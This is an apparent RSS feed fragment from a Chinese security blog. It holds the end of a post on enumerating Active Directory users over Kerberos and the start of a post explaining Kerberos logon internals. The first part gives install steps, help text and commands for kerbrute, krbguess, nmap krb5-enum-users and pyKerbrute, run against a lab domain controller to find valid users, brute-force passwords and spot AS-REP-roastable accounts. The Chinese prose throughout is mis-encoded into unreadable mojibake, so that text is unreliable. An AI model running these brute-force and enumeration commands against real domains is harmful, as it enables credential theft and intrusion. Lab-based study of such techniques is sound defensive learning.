&lt;p&gt;ä½¿ç”¨iPhacketåº“æ‰§è¡ŒKerberos Bruteforcingçš„è„šæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;å½“æ‰§è¡Œæ—¶ï¼Œä½œä¸ºè¾“å…¥ï¼Œå®ƒä¼šæ”¶åˆ°ç”¨æˆ·æˆ–å¯†ç åˆ—è¡¨æˆ–å¯†ç åˆ—è¡¨ã€‚ç„¶åæ˜¯å¯¹æšä¸¾æ”»å‡»è¿›è¡Œæšä¸¾ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æœ‰æ•ˆçš„ç”¨æˆ·å/å¯†ç å¯¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœ‰æ•ˆçš„ç”¨æˆ·å&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ— éœ€é¢„å…ˆéªŒè¯çš„ç”¨æˆ·å&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å› æ­¤ï¼Œè¯¥è„šæœ¬ç”Ÿæˆå‘ç°çš„æœ‰æ•ˆå‡­æ®åˆ—è¡¨ï¼Œè€ŒTGTç”Ÿæˆçš„å·²ç”Ÿæˆè¿™äº›æœ‰æ•ˆå‡­æ®ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…æ–¹æ³•1ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pip3 install kerbrute
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…æ–¹æ³•2ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/TarlogicSecurity/kerbrute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; kerbrute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install -r requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹ä¸‹å‘½ä»¤å‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@kali:~# kerbrute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Impacket v0.9.18 - Copyright &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; SecureAuth Corporation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usage: kerbrute.py &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-h&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-debug&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-user USER &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; -users USERS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-password PASSWORD &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; -passwords PASSWORDS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -domain DOMAIN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-dc-ip &amp;lt;ip_address&amp;gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-threads THREADS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-outputfile OUTPUTFILE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-no-save-ticket&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;optional arguments:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -h, --help            show this &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; message and &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -debug                Turn DEBUG output ON
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -user USER            User to perform bruteforcing
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -users USERS          File with user per line
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -password PASSWORD    Password to perform bruteforcing
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -passwords PASSWORDS  File with password per line
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -domain DOMAIN        Domain to perform bruteforcing
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -dc-ip &amp;lt;ip_address&amp;gt;   IP Address of the domain controller
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -threads THREADS      Number of threads to perform bruteforcing. &lt;span class=&#34;nv&#34;&gt;Default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -outputfile OUTPUTFILE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        File to save discovered user:password
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -no-save-ticket       Do not save retrieved TGTs with correct credentials
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Examples: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	./kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¡«å†™ç›¸å…³çš„ä¿¡æ¯ï¼Œæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerbrute -users ./aduser.txt -domain hack.lab -dc-ip 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°é™¤äº†æšä¸¾åŸŸç”¨æˆ·è¿˜å¯ä»¥æ£€æµ‹å‡ºå­˜åœ¨AS-REPRoastingæ¼æ´çš„ç”¨æˆ·luckyï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate//7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;krbguess&#34;&gt;krbguess&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªå·¥å…·å·²ç»æ‰¾ä¸åˆ°ä¸‹è½½åœ°å€äº†ï¼Œæˆ‘å¼„äº†ä¸€ä¸ªæ”¾åœ¨äº†GitHubä¸Šï¼Œä½†æ˜¯è¦æ±‚çš„javaç‰ˆæœ¬å¾ˆä½æ‰èƒ½æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Secd0g/krbGuess/releases/tag/krbguess&#34;&gt;https://github.com/Secd0g/krbGuess/releases/tag/krbguess&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å‘½ä»¤å‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Java â€“jar kerbguess.jar â€“r &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;domain&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; â€“d &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;user list&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; â€“s &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DC IP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;nmap-krb5-enum-users-nse-script&#34;&gt;Nmap krb5-enum-users NSE Script&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨çš„æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap  --script krb5-enum-users â€“script-args krb5-enum-users.realm&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[domain]&amp;#39;&lt;/span&gt;,userdb&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;user list&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;DC IP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -p &lt;span class=&#34;m&#34;&gt;88&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate//8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pykerbrute&#34;&gt;pyKerbrute&lt;/h2&gt;
&lt;p&gt;è¿™æ˜¯ä¸€æ¬¾ç”±3gstudentå¤§ä½¬æ”¹å†™çš„ä¸€æ¬¾å·¥å…·ï¼Œä½¿ç”¨Pythonå¿«é€ŸBruteForceé€šè¿‡Kerberosé¢„è®¤è¯æšä¸¾æœ‰æ•ˆçš„Active Directoryå¸æˆ·ã€‚&lt;/p&gt;
&lt;p&gt;GitHubåœ°å€ï¼šhttps://github.com/3gstudent/pyKerbrute&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/3gstudent/pyKerbrute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; pyKerbrute
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨python2ï¼Œå› ä¸ºkerberosæ˜¯ä½¿ç”¨88ç«¯å£è¿›è¡Œé€šä¿¡çš„ï¼Œå¯ä»¥ä½¿ç”¨tcpæˆ–è€…udpæ–¹å¼ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 EnumADUser.py 172.16.0.106 hack.lab ~/aduser.txt udp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æšä¸¾ç»“æœï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x03-æ€»ç»“&#34;&gt;0x03 æ€»ç»“&lt;/h1&gt;
&lt;p&gt;æœ¬æ–‡ä¸»è¦æ˜¯é€šè¿‡åœ¨æ²¡æœ‰è´¦æˆ·å¯†ç æƒ…å†µä¸‹å¯¹dcè¿›è¡ŒåŸŸç”¨æˆ·è¿›è¡Œæšä¸¾ï¼Œå¦‚æœåœ¨åŸŸç”¨æˆ·ç™»å½•æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨&lt;code&gt;net user /domain&lt;/code&gt;æ¥æŸ¥è¯¢å½“å‰åŸŸçš„æ‰€æœ‰ç”¨æˆ·ï¼Œä½†æ’é™¤æ˜¯åœ¨æœ‰æƒé™æŸ¥è¯¢çš„æƒ…å†µä¸‹ï¼Œè¦ä¸ç„¶ä½ ä½¿ç”¨å…¶ä»–çš„å·¥å…·ä¹Ÿæ˜¯ç™½æ­ã€‚&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-Kerberosè®¤è¯</title>
      <link>https://xxe.icu/kerberos_authentication.html</link>
      <pubDate>Sun, 20 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/kerberos_authentication.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-ç®€ä»‹&#34;&gt;0x00 ç®€ä»‹&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Kerberos&lt;/strong&gt;æ˜¯ä¸€ç§è®¡ç®—æœºç½‘ç»œæˆæƒåè®®,ç”±MIT(éº»çœç†å·¥å­¦é™¢)å¼€æ”¾çš„ä¸€å¥—è®¡ç®—æœºè½¯ä»¶ã€‚è½¯ä»¶è®¾è®¡ä¸Šé‡‡ç”¨å®¢æˆ·ç«¯/æœåŠ¡å™¨ç»“æ„ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¿›è¡Œç›¸äº’è®¤è¯ï¼Œå³å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å‡å¯å¯¹å¯¹æ–¹è¿›è¡Œèº«ä»½è®¤è¯ã€‚å¯ä»¥ç”¨äºé˜²æ­¢çªƒå¬ã€é˜²æ­¢é‡æ”¾æ”»å‡»ã€ä¿æŠ¤æ•°æ®å®Œæ•´æ€§ç­‰åœºåˆï¼Œæ˜¯ä¸€ç§åº”ç”¨å¯¹ç§°å¯†é’¥ä½“åˆ¶è¿›è¡Œå¯†é’¥ç®¡ç†çš„ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹å‰åœ¨æ–‡ç« &lt;a href=&#34;https://xxe.icu/posts/domain-security/&#34;&gt;Windowsè®¤è¯ä¸åŸŸæ¸—é€&lt;/a&gt;å½“ä¸­æŒ–äº†ä¸€ä¸ªå‘ï¼Œè¯´è¦æŠŠé‡Œé¢çš„è®¤è¯è¿‡ç¨‹å’Œè®¤è¯ä¸­çš„ç¼ºé™·(æ¼æ´)é‡æ–°å¤ä¹ ä¸€éã€‚æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œé€šè¿‡è¿™å‡ å¤©ä¸æ–­çš„å¤ä¹ ï¼Œå­¦åˆ°äº†å¾ˆå¤šçš„æ–°çŸ¥è¯†ï¼Œä¹Ÿåœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­è§£å†³äº†ä¸å°‘å­˜åœ¨çš„é—®é¢˜ã€‚kerberosè®¤è¯è¿‡ç¨‹ç¡®å®æ˜¯æŒºç¹æ‚çš„ï¼Œä½†æ˜¯å®‰å…¨æ€§å¾—åˆ°äº†ä¿è¯ã€‚ç½‘ä¸Šä¹Ÿç‰¹åˆ«å¤šå†™kerberosè®¤è¯çš„æ–‡ç« ï¼Œæˆ‘ä½œä¸ºä¸€ä¸ªèœé¸Ÿåœ¨æ­¤å°±å†™ä¸€ç¯‡æ–‡ç« æ¥æ€»ç»“å½’çº³ä¸€ä¸‹å­¦åˆ°çš„çŸ¥è¯†ï¼Œè‹¥æœ‰é”™è¯¯åœ°æ–¹è¯·å„ä½å‰è¾ˆæ–§æ­£ï¼Œå› ä¸ºKerberosåè®®åŸºäºå¯¹ç§°å¯†ç å­¦ï¼Œæˆ‘ä¹Ÿä¸æ˜¯ä¸“ä¸šå¯†ç å­¦çš„ï¼Œæ‰€ä»¥å½“ä¸­æ¶‰åŠåŠ å¯†çš„éƒ¨åˆ†ä¼šç•¥æµ…ä»‹ç»ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-ç¯å¢ƒ&#34;&gt;0x01 ç¯å¢ƒ&lt;/h1&gt;
&lt;p&gt;å»ºè®®å¤§å®¶éƒ½æŠŠç¯å¢ƒæ­å»ºè¿‡ä¸€éï¼Œå¯ä»¥å‚è€ƒ&lt;a href=&#34;https://blog.csdn.net/weixin_36711901/article/details/102995640&#34;&gt;
VMwareä¸­ç”¨è™šæ‹Ÿæœºæ¨¡æ‹Ÿæ­å»ºåŸŸ&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;ä¸»æœºç¯å¢ƒ&#34;&gt;ä¸»æœºç¯å¢ƒ&lt;/h2&gt;
&lt;p&gt;Windows Server 2019ï¼š172.16.0.106 ï¼ˆDCï¼‰&lt;/p&gt;
&lt;p&gt;Windows 10ï¼š172.16.0.111 ï¼ˆSQL Serverï¼‰&lt;/p&gt;
&lt;p&gt;Windows 7ï¼š172.16.0.105 ï¼ˆPCï¼‰&lt;/p&gt;
&lt;p&gt;Kali Linuxï¼š172.16.0.107 ï¼ˆAttackï¼‰&lt;/p&gt;
&lt;h2 id=&#34;å·¥å…·&#34;&gt;å·¥å…·&lt;/h2&gt;
&lt;p&gt;Wiresharkï¼š&lt;a href=&#34;https://www.wireshark.org/download.html&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Setspnï¼šWindowsè‡ªå¸¦&lt;/p&gt;
&lt;p&gt;Kerberos Configuration Managerï¼š&lt;a href=&#34;https://www.microsoft.com/en-us/download/details.aspx?id=39046&#34;&gt;download &lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;åŸŸç¯å¢ƒ&#34;&gt;åŸŸç¯å¢ƒ&lt;/h2&gt;
&lt;p&gt;åŸŸï¼šhack.lab&lt;/p&gt;
&lt;p&gt;åŸŸç®¡ç†å‘˜ï¼štestuser&lt;/p&gt;
&lt;p&gt;æ™®é€šç”¨æˆ·ï¼šluckyã€testsql&lt;/p&gt;
&lt;h1 id=&#34;0x02-è®¤è¯è¿‡ç¨‹&#34;&gt;0x02 è®¤è¯è¿‡ç¨‹&lt;/h1&gt;
&lt;p&gt;æˆ‘ä»¬å­¦ä¹ kerberosçš„ç›®çš„æ˜¯è¦äº†è§£è®¤è¯è¿‡ç¨‹ä¸­å‡ºç°çš„æ¼æ´ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰æ²¡æœ‰æƒ³è¿‡ä¸€ä¸ªé—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æˆ‘ä»¬ä½¿ç”¨åŸŸç”¨æˆ·ç™»å½•æŸå°å†…ç½‘ä¸»æœºçš„æ—¶å€™ï¼Œè®¤è¯è¿‡ç¨‹æ˜¯æ€ä¹ˆæ ·å‘ç”Ÿçš„å‘¢ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨win7ç™»å½•åŸŸç”¨æˆ·ä¼šåœ¨Wiresharkä¸­æŠ“åˆ°å¦‚ä¸‹å›¾çš„æµé‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;KRB5æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºkerberos v5åè®®ï¼Œä½†è¿™äº›AS_REQã€TGS_REQç­‰ä»£è¡¨ç€ä»€ä¹ˆå‘¢ï¼Œä¸‹é¢æˆ‘ä»¬å¸¦ç€é—®é¢˜æ¥äº†è§£ä¸€ä¸‹è¿™ä¸ªè®¤è¯è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;åŸºç¡€è®¤è¯&#34;&gt;åŸºç¡€è®¤è¯&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆäº†è§£å‡ ä¸ªåŸºç¡€çš„æ¦‚å¿µï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;ä¸»é¢˜&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows/win32/secauthn/winlogon&#34;&gt;Winlogon&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Winlogon ä¸º GINA DLL æä¾›ä¸€ç»„æ”¯æŒåŠŸèƒ½ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows/win32/secauthn/gina&#34;&gt;GINA&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;GINA DLL æä¾›å¯è‡ªå®šä¹‰çš„ç”¨æˆ·æ ‡è¯†å’Œèº«ä»½éªŒè¯è¿‡ç¨‹ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows/win32/secauthn/terminal-services-gina-functions&#34;&gt;ç»ˆç«¯æœåŠ¡ GINA å‡½æ•°&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;å¯ç”¨ç»ˆç«¯æœåŠ¡æ—¶ï¼ŒGINA å¿…é¡»è°ƒç”¨ Winlogon æ”¯æŒåŠŸèƒ½æ‰èƒ½å®Œæˆå¤šä¸ªä»»åŠ¡ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows/win32/secauthn/interaction-between-winlogon-and-gina&#34;&gt;Winlogon ä¸ GINA ä¹‹é—´çš„äº¤äº’&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Winlogon çš„çŠ¶æ€å†³å®šäº†è°ƒç”¨å“ªä¸ª GINA å‡½æ•°æ¥å¤„ç† (SAS) äº‹ä»¶çš„ä»»ä½•ç»™å®šçš„ &lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows/win32/secgloss/s-gly&#34;&gt;&lt;em&gt;å®‰å…¨æ³¨æ„é¡ºåº&lt;/em&gt;&lt;/a&gt; ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows/win32/secauthn/winlogon-notification-packages&#34;&gt;Winlogon é€šçŸ¥åŒ…&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;ä½ å¯ä»¥å®ç°é€šçŸ¥åŒ…æ¥ç›‘è§†å’Œå“åº” Winlogon äº‹ä»¶ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;LSA&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;æœ¬åœ°å®‰å…¨æœºæ„&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;SSPI&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;å®‰å…¨æ”¯æŒæä¾›è€…æ¥å£ï¼Œè¯¥æ¥å£è´Ÿè´£ä¸Kerberoså’ŒNTLMæœåŠ¡æ²Ÿé€š&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å…·ä½“çš„å†…å®¹å¯ä»¥é˜…è¯»&lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows/win32/secauthn/interaction-between-winlogon-and-gina&#34;&gt;
Winlogon ä¸GINA ä¹‹é—´çš„äº¤äº’&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œç°åœ¨æˆ‘ä»¬æ­£ä½¿ç”¨åŸŸç”¨æˆ·luckyç™»å½•Windows 7ï¼ˆå·²åŠ å…¥åŸŸï¼‰å…¶è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ç”¨æˆ·é¦–å…ˆæŒ‰Ctrl+Alt+Delç»„åˆé”®ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Winlogonæ£€æµ‹åˆ°ç”¨æˆ·æŒ‰ä¸‹SASé”®ï¼Œå°±è°ƒç”¨GINAï¼Œç”±GINAæ˜¾ç¤ºç™»å½•å¯¹è¯æ¡†ï¼Œä»¥ä¾¿ç”¨æˆ·è¾“å…¥è´¦å·å’Œå¯†ç ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç”¨æˆ·é€‰æ‹©æ‰€è¦ç™»å½•çš„åŸŸå’Œå¡«å†™è´¦å·ä¸å¯†ç ï¼ŒGINAå°†ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯å‘é€ç»™LSAè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœæ˜¯æœ¬åœ°ç”¨æˆ·ç™»å½•çš„è¯å°†ä¼šä½¿ç”¨æœ¬åœ°æ•°æ®åº“è¿›è¡Œè®¤è¯ï¼Œå¦‚æœæ˜¯åŸŸæ¸—é€çš„è¯å°†ä¼šä¸¢ç»™Kerberos SSPå»è®¤è¯ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åœ¨åŸŸç”¨æˆ·ç™»å½•åˆ°æœ¬æœºçš„æƒ…å†µä¸‹ï¼ŒLSAå°†è¯·æ±‚å‘é€ç»™KerberoséªŒè¯ç¨‹åºåŒ…ã€‚é€šè¿‡æ•£åˆ—ç®—æ³•ï¼Œæ ¹æ®ç”¨æˆ·ä¿¡æ¯ç”Ÿæˆä¸€ä¸ªå¯†é’¥ï¼Œå¹¶å°†å¯†é’¥å­˜å‚¨åœ¨è¯ä¹¦ç¼“å­˜åŒºä¸­ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿‡ç¨‹å¦‚å›¾ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/1.jpeg&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
